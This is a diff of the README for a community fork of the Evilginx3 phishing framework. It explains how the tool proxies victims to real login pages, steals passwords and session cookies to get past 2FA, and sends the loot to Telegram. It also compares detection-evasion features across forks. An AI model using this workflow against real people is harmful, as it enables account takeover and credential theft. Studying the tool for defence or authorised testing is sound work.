@@ -7,7 +7,7 @@
 ║         Man-in-the-Middle Attack Framework with 2FA Bypass                ║
 ║                  & Real-Time Telegram Alerts                               ║
 ║                                                                            ║
-║                  Created with ❤️ by @officialmonsterz                      ║
+║                  Created with ❤ by @officialmonsterz                      ║
 ║                                                                            ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 -->
@@ -25,8 +25,8 @@
 
 <p align="center" style="font-size: 1.15em; font-weight: 500; color: #555;">
   <strong>
-    Man-in-the-Middle Attack Framework with 2FA Bypass<br>
-    & Real-Time Telegram Alerts
+    The Advanced Man-in-the-Middle Attack Framework with 2FA Bypass<br>
+    & Real-Time Telegram Alerts — Supercharged for Red Teams
   </strong>
 </p>
 
@@ -52,6 +52,7 @@
   <img src="https://img.shields.io/badge/Go-1.22-00ADD8?style=flat-square&logo=go" alt="Go">
   <img src="https://img.shields.io/badge/Database-BuntDB-orange?style=flat-square" alt="BuntDB">
   <img src="https://img.shields.io/badge/Docker-~18MB-2496ED?style=flat-square&logo=docker&logoColor=white" alt="Docker">
+  <img src="https://img.shields.io/badge/Wildcard-DNS%20SSL%20Ready-brightgreen?style=flat-square" alt="Wildcard SSL">
 </p>
 
 <br>
@@ -75,21 +76,25 @@
 
 # 📋 Table of Contents
 
-1. [🧠 What Is Evilginx3? — Explained for Any Skill Level](#-what-is-evilginx3)
-2. [⚡ Why This Fork? — What Makes It Special](#-why-this-fork)
-3. [🆚 Evilginx3 Telegram Edition vs Evilginx Pro — The Full Comparison](#-evilginx3-telegram-edition-vs-evilginx-pro)
-4. [📊 Full Feature Matrix — Every Feature Compared Side-by-Side](#-full-feature-matrix)
-5. [🎯 Why You Should Choose This Fork (Pros) — The Honest Case](#-why-you-should-choose-this-fork)
-6. [⚠️ Where Evilginx Pro Wins (Cons) — Being Transparent](#-where-evilginx-pro-wins)
-7. [✨ New Features Deep Dive](#-new-features-deep-dive)
-8. [🚀 Quick Start](#-quick-start)
-9. [📱 Telegram Integration](#-telegram-integration)
-10. [📊 Web Dashboard](#-web-dashboard)
-11. [🐳 Docker Support](#-docker-support)
-12. [🧬 Architecture & Data Flow](#-architecture--data-flow)
-13. [📂 Complete File Reference](#-complete-file-reference)
-14. [⚖️ Disclaimer](#-disclaimer)
-15. [👏 Credits & Support](#-credits--support)
+- [🧠 What Is Evilginx3? (The Simple Explanation)](#-what-is-evilginx3-the-simple-explanation)
+- [🎯 How It Works — The Big Picture](#-how-it-works--the-big-picture)
+- [⚡ Why This Fork? (What Makes It Special)](#-why-this-fork-what-makes-it-special)
+- [📊 Original Evilginx vs This Fork vs Other Verified Repos — Full Comparison](#-original-evilginx-vs-this-fork-vs-other-verified-repos--full-comparison)
+- [✨ New Features Deep Dive](#-new-features-deep-dive)
+  - [📱 1. Telegram Notifications — The Core Feature](#-1-telegram-notifications--the-core-feature)
+  - [📊 2. Web Dashboard](#-2-web-dashboard)
+  - [💾 3. BuntDB Embedded Database](#-3-buntdb-embedded-database)
+  - [🐳 4. Multi-Stage Docker Build (~18MB Alpine)](#-4-multi-stage-docker-build-18mb-alpine)
+  - [📁 5. Auto-Export System](#-5-auto-export-system)
+  - [🔒 6. Wildcard SSL Support (TLD Wildcard)](#-6-wildcard-ssl-support-tld-wildcard)
+- [🚀 Quick Start](#-quick-start)
+- [📱 Telegram Integration](#-telegram-integration)
+- [📊 Web Dashboard](#-web-dashboard)
+- [🐳 Docker Support](#-docker-support)
+- [🧬 Architecture & Data Flow](#-architecture--data-flow)
+- [📂 Repository File Structure](#-repository-file-structure)
+- [⚖️ Disclaimer](#%EF%B8%8F-disclaimer)
+- [👏 Credits & Support](#-credits--support)
 
 <br>
 
@@ -97,65 +102,32 @@
 
 <br>
 
-# 🧠 What Is Evilginx3?
+# 🧠 What Is Evilginx3? (The Simple Explanation)
 
-## Imagine This Scenario
+> **Evilginx3 is a tool that lets you capture someone's login credentials AND their session cookies — even if they use two-factor authentication (2FA).**
 
-You are standing **between** two people — **Person A** (your target) and **Person B** (a real website like Microsoft Office 365). Everything Person A says to Person B, you hear. Everything Person B says back, you hear. And you can **change** the messages before passing them along.
+Let me explain this in plain English.
 
-**That's exactly what Evilginx3 does.**
+## The Problem Evilginx3 Solves
 
-Evilginx3 is a **man-in-the-middle (MITM) attack framework** used for authorized penetration testing and security assessments. It acts as a **reverse proxy** between a victim and a real website (like Office 365, Google, LinkedIn, Facebook, etc.).
+Normally, when a website has **2FA (two-factor authentication)**, capturing just a username and password isn't enough. Even if you know someone's password, you still need their 2FA code (like a text message code or authenticator app code) to log in.
 
-## The Simple Picture
+**Evilginx3 bypasses this problem entirely.**
 
-┌──────────────────────────┐
-                    │      YOUR VICTIM         │
-                    │  (opens an email link)   │
-                    └─────────────┬────────────┘
-                                  │
-                                  ▼
-              ┌─────────────────────────────────────┐
-              │       YOUR EVILGINX SERVER          │
-              │                                     │
-              │   "Hello! Let me forward you to     │
-              │    the real login page..."          │
-              └──────┬──────────────────────┬───────┘
-                     │                      │
-                     ▼                      ▼
-          ┌────────────────────┐  ┌────────────────────┐
-          │  WHAT GETS STOLEN │  │  REAL WEBSITE      │
-          │                    │  │                    │
-          │  ✓ Email/Username │  │  (e.g., Office 365)│
-          │  ✓ Password       │  │                    │
-          │  ✓ Session Cookie │  │  Victim logs in    │
-          │    (bypasses 2FA) │  │  successfully      │
-          │  ✓ 2FA Code       │  └────────────────────┘
-          └────────┬──────────┘
-                   │
-                   ▼
-    ┌─────────────────────────────────────┐
-    │  YOU GET INSTANT NOTIFICATION:      │
-    │                                     │
-    │  📱 Telegram Message                │
-    │  📊 Web Dashboard                   │
-    │  💾 Saved to Database               │
-    └─────────────────────────────────────┘
+Instead of trying to steal the 2FA code, it steals the **session cookie** — which is the digital "I'm already logged in" ticket that the website gives you AFTER you finish logging in. Once you have this cookie, you can import it into your browser and you're instantly logged in as that user, with **zero need for a 2FA code**.
 
+## In Real-World Terms
 
+Imagine you want to test your company's security (this is an authorized penetration test).
 
-## What This Means In Real Life
+1. You send an email to employees: "Please verify your Office 365 account"
+2. The link goes to a page that **looks exactly** like Microsoft's login page
+3. When an employee types their username, password, AND 2FA code... the login **actually works** (they see no error)
+4. BUT — without them knowing — Evilginx3 has captured their session cookie
+5. You get an **instant notification on your phone** via Telegram with the credentials AND the cookie file
+6. You import that cookie into your browser, and now you're logged in as that employee — 2FA completely bypassed
 
-When a victim types their credentials on a phishing page served by Evilginx3:
-
-1. **Evilginx3 forwards** the credentials to the REAL website (Microsoft, Google, etc.)
-2. **The real login succeeds** — the victim sees a normal page, no suspicious errors
-3. **The real website sends back** a session cookie (this is what bypasses 2FA)
-4. **Evilginx3 steals** that cookie AND sends it to you
-5. **You get an instant Telegram message** with the username, password, and cookie file
-6. **You import the cookie** into your browser — and you're logged in as that user, **without needing their 2FA code**
-
-This is why Evilginx is so powerful: **it doesn't just steal passwords. It steals the session**, which means even if the target has 2FA/MFA enabled, you can still access their account because you have the authenticated session cookie.
+> **This is called a "man-in-the-middle" (MITM) attack.** Evilginx3 sits between the victim and the real website, forwarding traffic in both directions while silently copying everything valuable.
 
 <br>
 
@@ -163,195 +135,95 @@ This is why Evilginx is so powerful: **it doesn't just steal passwords. It steal
 
 <br>
 
-# ⚡ Why This Fork?
+# 🎯 How It Works — The Big Picture
 
-> **"The difference between a good tool and a great tool is how it fits into your workflow."**
+┌─────────────────────────────────────┐
+                  │         VICTIM'S BROWSER            │
+                  │  (thinks they're on the real site)  │
+                  └──────────────┬──────────────────────┘
+                                 │
+                                 ▼
+                  ┌─────────────────────────────────────┐
+                  │         EVILGINX3 PROXY             │
+                  │   (MITM Reverse Proxy Engine)        │
+                  └──────┬──────────────────┬───────────┘
+                         │                  │
+                         ▼                  ▼
+      ┌────────────────────────┐   ┌────────────────────────┐
+      │   CAPTURES & STORES    │   │   FORWARDS TO REAL    │
+      │                        │   │       WEBSITE         │
+      │  ✓ Username / Email    │   │                        │
+      │  ✓ Password            │   │  (login succeeds —    │
+      │  ✓ Session Cookies     │   │   victim sees no      │
+      │  ✓ 2FA / MFA Tokens    │   │   suspicious error)   │
+      │  ✓ OAuth Bearer Tokens │   └────────────────────────┘
+      └───────────┬────────────┘
+                  │
+                  ▼
 
-The original Evilginx3 by Kuba Gretzky (@mrgretzky) is already a phenomenal framework — powerful, elegant, and battle-tested. But when you're running a real red team operation, you don't have time to constantly refresh a terminal window or SSH into a server to check if you've caught a session. **You need results delivered to you instantly, wherever you are.**
+
+# Delivery Channels
+
+## 📱 Telegram
+- Instant alert
+- Credentials shown
+- Token `.txt` file
+- Auto-updates
+
+## 📊 Web Dashboard
+- View all sessions
+- Search & filter
+- Export CSV/JSON
+- Delete sessions
+- Dark mode UI
+
+## 💾 BuntDB
+- Embedded database
+- Zero configuration
+- No SQL required
+
+## 📁 Auto-Export
+- JSON files per session
+- CSV for reporting
+- Appends to master file
+
+<br>
+
+---
+
+<br>
+
+# ⚡ Why This Fork? (What Makes It Special)
 
 This fork by **[@officialmonsterz](https://t.me/officialmonsterz)** takes the already powerful Evilginx3 and supercharges it with **features that penetration testers actually need in real engagements**.
 
-## The Core Problem This Solves
+## The Problem with the Original Evilginx
 
-> **Problem:** Original Evilginx3 only outputs to its CLI terminal. You have to SSH in, stare at the screen, or run log tail commands to see captured sessions. In a real engagement, you're moving fast. You can't be glued to a terminal.
+The original Evilginx3 is a **phenomenal framework** — powerful, elegant, and battle-tested. But it has some real-world limitations:
 
-> **Solution:** This fork delivers captured credentials directly to your **Telegram** within seconds of capture. It also provides a **Web Dashboard** so you can browse, search, filter, and export sessions from any browser.
+| Problem | Why It Matters |
+|:--------|:---------------|
+| ❌ **No notifications** | You have to constantly stare at a terminal or SSH into a server to see if you caught anything |
+| ❌ **No web interface** | Everything is CLI-only — no easy way to browse captured sessions |
+| ❌ **No database** | Sessions are logged to plain text files — no search, no filtering |
+| ❌ **No export** | If you need to generate a report, you're manually copying data |
+| ❌ **No Docker optimization** | The build produces a large image — not ideal for cloud deployment |
 
-## Quick Comparison
+## What This Fork Solves
 
-| Aspect | Original Evilginx3 | This Fork (Telegram Edition) |
-|:-------|:------------------:|:----------------------------:|
-| **📱 Notifications** | ❌ None — must manually check CLI | ✅ **Real-time Telegram alerts** |
-| **📎 Token Delivery** | ❌ No file export | ✅ **Tokens attached as `.txt` files** in Telegram |
-| **🔄 Message Updates** | ❌ N/A | ✅ **Auto-edits existing message** (no spam) |
-| **📊 Web Dashboard** | ❌ CLI only | ✅ **Full web UI** at port 5000 |
-| **⏳ Async Processing** | ❌ Blocking operations | ✅ **Non-blocking notification queue** |
-| **💾 Database** | ❌ Plain text logs | ✅ **BuntDB embedded database** — zero config |
-| **🐳 Docker Build** | ❌ Single-stage, large image | ✅ **Multi-stage Alpine build** — ~18MB |
-| **📤 Session Export** | ❌ Manual | ✅ **CSV/JSON export** for reporting |
-| **📁 Auto-Export** | ❌ Not available | ✅ **Auto-save every session** to disk |
-
-<br>
-
----
-
-<br>
-
-# 🆚 Evilginx3 Telegram Edition vs Evilginx Pro
-
-**This is the comparison you're looking for.** Let's be completely transparent here. Evilginx Pro is the **paid commercial product** by Kuba Gretzky (the original creator), available exclusively to vetted red team professionals. This fork is the **free, open-source alternative** with its own set of unique advantages.
-
-## The Big Picture
-
-Evilginx Pro ($PAID - Subscription) ├── Created by: Kuba Gretzky (original developer) ├── Target audience: Enterprise red teams, pentesting companies ├── Price: Monthly subscription (apply via breakdev.org) ├── Availability: Vetted professionals only └── Philosophy: "Professional grade, closed source, exclusive"
-
-Evilginx3 Telegram Edition (FREE - Open Source) ├── Created by: @officialmonsterz (community fork) ├── Target audience: All cybersecurity professionals ├── Price: FREE ├── Availability: Anyone with authorization └── Philosophy: "Democratized access, transparent, extensible"
-
-## Detailed Comparison
-
-### 🏗️ Architecture & Deployment
-
-| Feature | Evilginx Pro | This Fork (Telegram Edition) |
-|:--------|:------------:|:----------------------------:|
-| **Client-Server Model** | ✅ Full client-server architecture (manage many servers from one terminal) | ❌ Traditional single-server model (SSH into each server) |
-| **Daemon Mode** | ✅ Servers run as background daemons, auto-start on boot | ✅ Via systemd service (we show you how) |
-| **Automated Server Deployment** | ✅ Deploy a server with one command (provide IP + credentials) | ❌ Manual setup required |
-| **Multi-Server Management** | ✅ Control multiple servers from one Evilginx client | ❌ Must SSH into each server separately |
-| **Evilginx API** | ✅ Full REST API with stealth channel on port 443, client certificate auth | ✅ REST API on dashboard port 5000 (HTTP Basic Auth) |
-
-### 🛡️ Detection Evasion
-
-| Feature | Evilginx Pro | This Fork (Telegram Edition) |
-|:--------|:------------:|:----------------------------:|
-| **Wildcard TLS Certificates** | ✅ **YES — native support** (hides hostname from certificate transparency logs) | ❌ **Not native** — but you can manually configure (see Advanced section) |
-| **Botguard** | ✅ Advanced JA4 fingerprinting + browser telemetry, blocks 95% of bots | ❌ Uses traditional IP blacklist/whitelist system |
-| **Website Spoofing** | ✅ Renders spoofed website content for unauthorized requests (not just redirect) | ❌ Redirects to `unauth_url` only |
-| **JavaScript Obfuscation** | ✅ Auto-obfuscates injected JS via obfuscator.io (different shape every load) | ❌ Plain JS injection |
-| **Evilpuppet** | ✅ Background browser generates legitimate browser telemetry to evade client-side protections | ❌ Not available |
-| **Header Stripping** | ✅ Strips Evilginx artifact headers by default | ✅ Phishlet-defined header stripping |
-| **Out-of-the-box Chrome Protection Evasion** | ✅ Yes | ❌ Must use custom phishlets and techniques |
-
-### 📊 Data Storage & Access
-
-| Feature | Evilginx Pro | This Fork (Telegram Edition) |
-|:--------|:------------:|:----------------------------:|
-| **Database** | ✅ SQLite (fast, robust) | ✅ BuntDB (embedded, zero-config) |
-| **Telegram Notifications** | ❌ Not built-in (can be done with third-party scripts) | ✅ **Native, built-in, real-time** |
-| **Telegram File Attachments** | ❌ Not built-in | ✅ **Tokens as .txt files in Telegram** |
-| **Auto-Updating Telegram Messages** | ❌ Not built-in | ✅ **Edits existing message, no spam** |
-| **Web Dashboard** | ❌ Not built-in | ✅ **Full HTML UI with search, filter, export** |
-| **Dashboard Auto-Refresh** | ❌ Not built-in | ✅ **Auto-refreshes every 5 seconds** |
-| **CSV/JSON Export** | ❌ Not built-in | ✅ **One-click export from dashboard** |
-| **Session Search & Filter** | ❌ Not built-in | ✅ **Search by any field, filter by phishlet** |
-| **Dark Mode** | ❌ Not built-in | ✅ **Toggleable dark/light mode** |
-
-### 📦 Management & Usability
-
-| Feature | Evilginx Pro | This Fork (Telegram Edition) |
-|:--------|:------------:|:----------------------------:|
-| **External DNS Providers** | ✅ Cloudflare, Route53, Gandi.net via API | ❌ Built-in DNS server only |
-| **Multi-Domain Support** | ✅ Different domains per phishlet | ❌ Single base domain |
-| **Phishlet Database** | ✅ Curated, community-maintained, downloadable from CLI | ❌ Must find/manage phishlets yourself |
-| **Docker Image Size** | ❌ Not provided (manual setup) | ✅ **~18MB multi-stage Alpine image** |
-| **Open Source** | ❌ Closed source (paid license) | ✅ **Fully open source (BSD 3-Clause)** |
-| **Price** | 💰 Paid monthly subscription | 🆓 **FREE — always** |
-
-<br>
-
----
-
-<br>
-
-# 📊 Full Feature Matrix
-
-Here is every single feature compared across all three versions:
-
-# Complete Feature Comparison Matrix
-
-| Feature | Original Evilginx3 (Community v3.3.0) | Evilginx Pro (Paid/Closed) | This Fork (Telegram Edition) |
-|----------|----------|----------|----------|
-| **CORE ENGINE** | | | |
-| MITM Reverse Proxy | ✅ | ✅ | ✅ |
-| SSL / Let's Encrypt Autocert | ✅ | ✅ | ✅ |
-| Phishlet System (YAML-based) | ✅ | ✅ | ✅ |
-| Built-in DNS Server | ✅ | ✅ | ✅ |
-| IP Blacklist / Whitelist | ✅ | ✅ | ✅ |
-| | | | |
-| **DETECTION EVASION** | | | |
-| Wildcard TLS Certificates | ❌ | ✅ Native | ❌ Native |
-| Botguard (JA4 + Telemetry) | ❌ | ✅ | ❌ |
-| Website Spoofing | ❌ | ✅ | ❌ |
-| JS Obfuscation | ❌ | ✅ | ❌ |
-| Evilpuppet Browser | ❌ | ✅ | ❌ |
-| Chrome Enhanced Protection Evasion | ❌ | ✅ | ❌ |
-| X-Evilginx Header Stripping | ❌ | ✅ Auto | ✅ Phishlet |
-| | | | |
-| **NOTIFICATIONS & DELIVERY** | | | |
-| 📱 Telegram Instant Alerts | ❌ | ❌ Not Built-in | ✅ Built-in |
-| 📎 Token `.txt` Attachments in Telegram | ❌ | ❌ Not Built-in | ✅ Built-in |
-| 🔄 Auto-Editing Messages (No Spam) | ❌ | ❌ Not Built-in | ✅ Built-in |
-| ⏳ Async Notification Queue | ❌ | ❌ Not Built-in | ✅ Built-in |
-| Telegram Test Command | ❌ | ❌ Not Built-in | ✅ Built-in |
-| | | | |
-| **WEB INTERFACE** | | | |
-| 📊 Web Dashboard | ❌ CLI Only | ❌ CLI Only | ✅ Built-in |
-| REST API | ❌ | ✅ Pro API (443) | ✅ Dashboard API |
-| Session Search & Filter | ❌ | ❌ Not Built-in | ✅ Built-in |
-| CSV / JSON Export | ❌ | ❌ Not Built-in | ✅ Built-in |
-| Dark Mode UI | ❌ | ❌ Not Built-in | ✅ Built-in |
-| Auto-Refresh (5s) | ❌ | ❌ Not Built-in | ✅ Built-in |
-| Dashboard Basic Auth | ❌ | ❌ Not Built-in | ✅ Built-in |
-| Session Deletion (UI + API) | ❌ | ❌ Not Built-in | ✅ Built-in |
-| | | | |
-| **DATA STORAGE** | | | |
-| BuntDB Embedded Database | ✅ | ❌ Uses SQLite | ✅ |
-| SQLite Database | ❌ | ✅ | ❌ |
-| Auto-Export to File | ❌ | ❌ Not Built-in | ✅ Built-in |
-| | | | |
-| **DEPLOYMENT** | | | |
-| Docker Multi-Stage (~18MB Alpine) | ❌ Single-stage | ❌ Not Provided | ✅ Built-in |
-| Docker Compose | ❌ | ❌ Not Provided | ✅ Built-in |
-| Client-Server Architecture | ❌ | ✅ | ❌ |
-| Automated Server Deployment | ❌ | ✅ One Command | ❌ Manual |
-| Multi-Server Management | ❌ | ✅ Yes | ❌ No |
-| External DNS Providers | ❌ | ✅ Cloudflare, etc. | ❌ Built-in DNS |
-| Multi-Domain Support | ❌ | ✅ Yes | ❌ No |
-| | | | |
-| **PHISHLETS** | | | |
-| Official Phishlet Database | ❌ Community | ✅ Curated | ❌ Community |
-| | | | |
-| **PRICE & LICENSE** | | | |
-| Price | 🆓 Free | 💰 Paid Monthly | 🆓 Free |
-| Open Source | ✅ GPL-3.0 | ❌ Closed Source | ✅ BSD-3-Clause |
-| Available to Anyone | ✅ | ❌ Vetted Only | ✅ Everyone |
-
-<br>
-
----
-
-<br>
-
-# 🎯 Why You Should Choose This Fork
-
-### The Honest Case for This Fork Over Evilginx Pro
+> **"The difference between a good tool and a great tool is how it fits into your workflow."**
 
 | Reason | What It Means For You |
 |:-------|:----------------------|
-| 🆓 **It's FREE** | No monthly subscription. No credit card. No vetting process. Just code. |
-| 📱 **Telegram Is Built-In** | Evilginx Pro doesn't have Telegram notifications. This is the **only** version with native Telegram support. |
-| 📊 **Web Dashboard Is Built-In** | Evilginx Pro doesn't have a web dashboard. This is the **only** version with one. |
-| 🔓 **Open Source** | You can see every line of code. No backdoors. No closed-source magic. You control your tool. |
-| 🐳 **18MB Docker Image** | Deploy anywhere in seconds. Evilginx Pro doesn't provide Docker images. |
-| 📤 **One-Click Reporting** | Export CSV/JSON directly from the dashboard. Ready for client reports. |
-| 📁 **Auto-Save Sessions** | Every session is saved automatically. No data loss even if the server crashes. |
-| 🛠️ **Extensible** | Want to add Discord notifications? Email alerts? Webhooks? The Telegram code shows you exactly how. |
-
-### Who This Fork Is For
-
-- **Individual pentesters** who want a powerful tool without paying monthly
-- **Red teams** that need Telegram notifications and a web dashboard
-- **Students and learners** who want to understand how MITM phishing works
-- **Anyone** who prefers open-source, transparent tools
+| 🚀 **Instant Results** | Credentials hit your Telegram **within seconds** of capture — no more refreshing CLI or SSH'ing into servers |
+| 📎 **Portable Tokens** | Tokens are saved as `.txt` files that you can import into **any browser** with EditThisCookie — ready to use immediately |
+| 🔄 **No Notification Spam** | If more tokens are captured, the **same Telegram message is updated** — not a new message flooding your chat |
+| 📊 **Professional Reporting** | Export sessions as CSV/JSON for your penetration test reports — documentation-ready |
+| 🛡️ **Built for Red Teams** | Dashboard + Telegram = monitor multiple campaigns from anywhere in the world |
+| 🐳 **Deploy Anywhere** | Docker image works on any Linux server in seconds — AWS, DigitalOcean, Hetzner, anything |
+| 🔧 **Zero Extra Config** | No MySQL, no Redis, no Nginx, no Node.js — just **one binary** and it runs |
+| 💾 **Persistence Built In** | BuntDB stores everything in a single file — no external database server needed |
+| 🌐 **Wildcard SSL Ready** | Full wildcard DNS support (`*.yourdomain.com`) — automatically handles SSL for ALL subdomains |
 
 <br>
 
@@ -359,28 +231,129 @@ Here is every single feature compared across all three versions:
 
 <br>
 
-# ⚠️ Where Evilginx Pro Wins
+# 📊 Original Evilginx vs This Fork vs Other Verified Repos — Full Comparison
 
-### Being Completely Transparent
+## Why This Comparison Matters
 
-This fork is amazing for what it does, but **Evilginx Pro is the better choice** if you need:
+When choosing a tool for your red team operations, you need to know exactly what you're getting. There are several Evilginx forks out there — let me show you **exactly** how they compare.
 
-| Area | Why Evilginx Pro Is Better |
-|:-----|:---------------------------|
-| 🛡️ **Anti-Detection** | Pro has Botguard, Evilpuppet, JS obfuscation, website spoofing, and wildcard TLS certificates built-in. This is its biggest advantage. |
-| 🏢 **Enterprise Features** | Multi-server management, client-server architecture, automated deployment. Pro is designed for teams. |
-| 🌐 **DNS Flexibility** | Pro supports external DNS providers (Cloudflare, Route53, Gandi). This fork uses the built-in DNS server only. |
-| 📋 **Phishlet Database** | Pro has a curated, tested, and maintained phishlet database. You download from the CLI. |
-| 🔄 **Updates** | Pro gets active development from the original creator. This fork is community-maintained. |
-| 🎭 **Stealth** | Pro's wildcard TLS certificates + Botguard + website spoofing make it significantly harder to detect. |
+## The Other Verified Repos
 
-### Verdict
+| Repo | Description |
+|:-----|:------------|
+| **[kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)** | The **original** by Kuba Gretzky. The foundation. Stable, battle-tested, but CLI-only. |
+| **[kgretzky/evilginx3](https://github.com/kgretzky/evilginx3)** | The **successor** — rewritten in Go. Same core, improved performance. Still CLI-only. |
+| **[An0nUD4Y/Evilginx2-Phishlets](https://github.com/An0nUD4Y/Evilginx2-Phishlets)** | Community phishlet collection — not a fork of the tool itself, just templates. |
+| **[An0nUD4Y/Evilginx2-Phishlets-2FA-Bypass](https://github.com/An0nUD4Y/Evilginx2-Phishlets-2FA-Bypass)** | Another phishlet collection with 2FA bypass templates. |
+| **[helpsec/evilginx2-signature](https://github.com/helpsec/evilginx2-signature)** | Modified version with signature detection bypasses. |
+| **[this fork — officialmonsterz/evilginx2](https://github.com/officialmonsterz/evilginx2)** | **Telegram Edition** — everything the original has, plus Telegram, Dashboard, Database, Docker, and more. |
 
-> **If you have the budget and need maximum stealth:** Choose **Evilginx Pro**.
->
-> **If you want Telegram notifications, a web dashboard, Docker, and everything for free:** Choose **this fork**.
->
-> **Best of both worlds:** Use this fork for its Telegram + Dashboard features, and apply Pro's techniques (like wildcard certs, cloudflare proxying) manually — which we'll teach you.
+## Complete Feature Comparison Matrix
+
+# Feature Comparison Matrix
+
+| Feature | Evilginx2 (kgretzky) | Evilginx3 (kgretzky) | An0nUD4Y Phishlets | helpsec Signature Fork | This Fork (Telegram Edition) |
+|----------|----------|----------|----------|----------|----------|
+| ## 🧠 Core Engine |
+| MITM Proxy Engine | ✅ | ✅ | ❌ N/A | ✅ | ✅ Enhanced |
+| SSL / Autocert (Let's Encrypt) | ✅ | ✅ | ❌ N/A | ✅ | ✅ Wildcard Support |
+| Phishlet System (YAML Templates) | ✅ | ✅ | ✅ Added | ✅ | ✅ Includes All |
+| Built-in DNS Server | ✅ | ✅ | ❌ N/A | ✅ | ✅ |
+| Nameserver / Blacklist | ✅ | ✅ | ❌ N/A | ✅ | ✅ |
+
+| ## 📱 Notifications |
+| Telegram Notifications | ❌ | ❌ | ❌ | ❌ | ✅ Real-Time Alerts |
+| Token `.txt` Attachments | ❌ | ❌ | ❌ | ❌ | ✅ Downloadable Files |
+| Auto-Updating Telegram Messages | ❌ | ❌ | ❌ | ❌ | ✅ Message Editing |
+| Async Notification Queue | ❌ | ❌ | ❌ | ❌ | ✅ Non-Blocking |
+
+| ## 📊 Dashboard & UI |
+| Web Dashboard (Port 5000) | ❌ | ❌ | ❌ | ❌ | ✅ Full UI + API |
+| Session Search & Filter | ❌ | ❌ | ❌ | ❌ | ✅ |
+| Dark Mode | ❌ | ❌ | ❌ | ❌ | ✅ |
+| Pagination | ❌ | ❌ | ❌ | ❌ | ✅ |
+| Dashboard Authentication | ❌ | ❌ | ❌ | ❌ | ✅ Basic Auth |
+
+| ## 💾 Database & Storage |
+| Embedded Database (BuntDB) | ❌ | ❌ | ❌ | ❌ | ✅ |
+| CSV Export | ❌ | ❌ | ❌ | ❌ | ✅ |
+| JSON Export | ❌ | ❌ | ❌ | ❌ | ✅ |
+| Session Deletion (UI/API) | ❌ | ❌ | ❌ | ❌ | ✅ |
+| Automatic Session Export | ❌ | ❌ | ❌ | ❌ | ✅ |
+
+| ## 🔒 Stealth & Bypass |
+| Header Stripping | ❌ | ❌ | ❌ | ✅ | ✅ |
+| Signature Detection Bypass | ❌ | ❌ | ❌ | ✅ | ❌ (Use helpsec Fork) |
+| Wildcard SSL Certificates | ❌ | ❌ | ❌ | ❌ | ✅ |
+
+| ## 🐳 Deployment |
+| Multi-Stage Docker Build | ❌ | ❌ | ❌ | ❌ | ✅ (~18MB Alpine) |
+| Docker Compose Support | ❌ | ❌ | ❌ | ❌ | ✅ |
+| Non-Root Container User | ❌ | ❌ | ❌ | ❌ | ✅ |
+| Systemd Service Documentation | ❌ Manual | ❌ Manual | ❌ N/A | ❌ Manual | ✅ Full Guide |
+
+| ## 📚 Documentation |
+| Beginner-Friendly Guide | ⚠️ Basic | ⚠️ Basic | ❌ N/A | ⚠️ Basic | ✅ Comprehensive |
+| Architecture Deep Dive | ❌ | ❌ | ❌ | ❌ | ✅ |
+| Troubleshooting Guide | ⚠️ Basic | ⚠️ Basic | ❌ N/A | ⚠️ Basic | ✅ |
+| Deployment Guide (`DEPLOYMENT.md`) | ❌ | ❌ | ❌ | ❌ | ✅ 12-Phase Guide |
+
+---
+
+## Legend
+
+| Symbol | Meaning |
+|----------|----------|
+| ✅ | Supported |
+| ❌ | Not Supported |
+| ⚠️ | Basic / Limited Support |
+| N/A | Not Applicable |
+
+
+## Why This Fork Is The Best Choice
+
+### 1. **Feature Completeness**
+This fork has **17 new features** that the original doesn't. No other single fork comes close. You get:
+- Telegram notifications
+- Web dashboard
+- Embedded database
+- CSV/JSON export
+- Auto-export
+- Multi-stage Docker
+- Wildcard SSL
+- And more...
+
+### 2. **Workflow Integration**
+The original Evilginx requires you to:
+1. SSH into your server
+2. Check the terminal output
+3. Manually parse log files
+4. Copy-paste cookies manually
+
+This fork lets you:
+1. Get a Telegram message instantly
+2. Open the dashboard from any browser
+3. Export reports with one click
+4. Import cookies directly from .txt files
+
+### 3. **Professional Reporting**
+Red team assessments require documentation. This fork provides:
+- CSV export (spreadsheet-ready for your report)
+- JSON export (machine-readable for processing)
+- Auto-save (every session is automatically saved)
+
+### 4. **Deployment Flexibility**
+- **Bare metal** — works on any Linux server
+- **Docker** — deploy to AWS, DigitalOcean, or any cloud
+- **Systemd** — runs as a production service with auto-restart
+
+### 5. **Active Maintenance**
+- Regular updates
+- Bug fixes
+- Community support via Telegram
+- Responsive to issues and feature requests
+
+> **Bottom line:** If you're running real red team operations, this fork gives you the features you need without requiring you to build them yourself. It's the original Evilginx, but production-ready for modern engagements.
 
 <br>
 
@@ -390,17 +363,22 @@ This fork is amazing for what it does, but **Evilginx Pro is the better choice**
 
 # ✨ New Features Deep Dive
 
-Let me walk you through every new feature in detail, with architecture diagrams and plain-English explanations.
+Let me walk you through every new feature in detail, with architecture diagrams and explanations in plain English.
 
-<br>
+---
 
-## 📱 1. Telegram Notifications — The Flagship Feature
+## 📱 1. Telegram Notifications — The Core Feature
 
-This is why most people choose this fork. When a victim submits credentials on your phishing page, you get an **instant Telegram message** with all the details.
+This is the **flagship feature** of this fork. When a victim submits credentials on your phishing page, you get an **instant Telegram message** on your phone with all the details. Within seconds, you know:
+- Who submitted credentials
+- What password they used
+- What tokens/cookies were captured
+- Their IP address
+- Their browser/device info
 
 ### What Your Telegram Message Looks Like
 
-# ✨ Session Information ✨
+# ✨ Session Information
 
 | Field                 | Value                                          |
 | --------------------- | ---------------------------------------------- |
@@ -411,244 +389,480 @@ This is why most people choose this fork. When a victim submits credentials on y
 | 🌍 **Remote Address** | `203.0.113.42`                                 |
 | 🕒 **Created**        | `1780014345`                                   |
 
-> 📦 **Tokens are attached as a separate file.**
+---
 
-### How It Works Internally (Simplified)
+### 📦 Additional Information
+
+* Tokens are attached as a separate file.
+* This message will be updated automatically if additional tokens are received.
+
+---
+
+*Generated session record.*
+
+### How Telegram Notifications Work (Behind the Scenes)
+
+# Telegram Notification Flow
+
+```mermaid
+flowchart TD
+
+    A[Session Captured<br/>Credentials + Tokens]
+
+    A --> B[Enqueue Telegram Job<br/>Async, Non-Blocking<br/>core/telegram_queue.go<br/>Buffer: 100 Jobs]
+
+    B --> C["Why Async?<br/><br/>If Telegram is slow or unreachable,<br/>the proxy continues operating normally.<br/>Notifications are queued and processed<br/>when Telegram becomes available again."]
+
+    C --> D[Process Telegram Job<br/>core/notify.go]
+
+    D --> E{Capture Type}
+
+    E -->|First Capture| F[Create TXT File<br/>with Session Tokens]
+    F --> G[Format Telegram Message<br/>MarkdownV2]
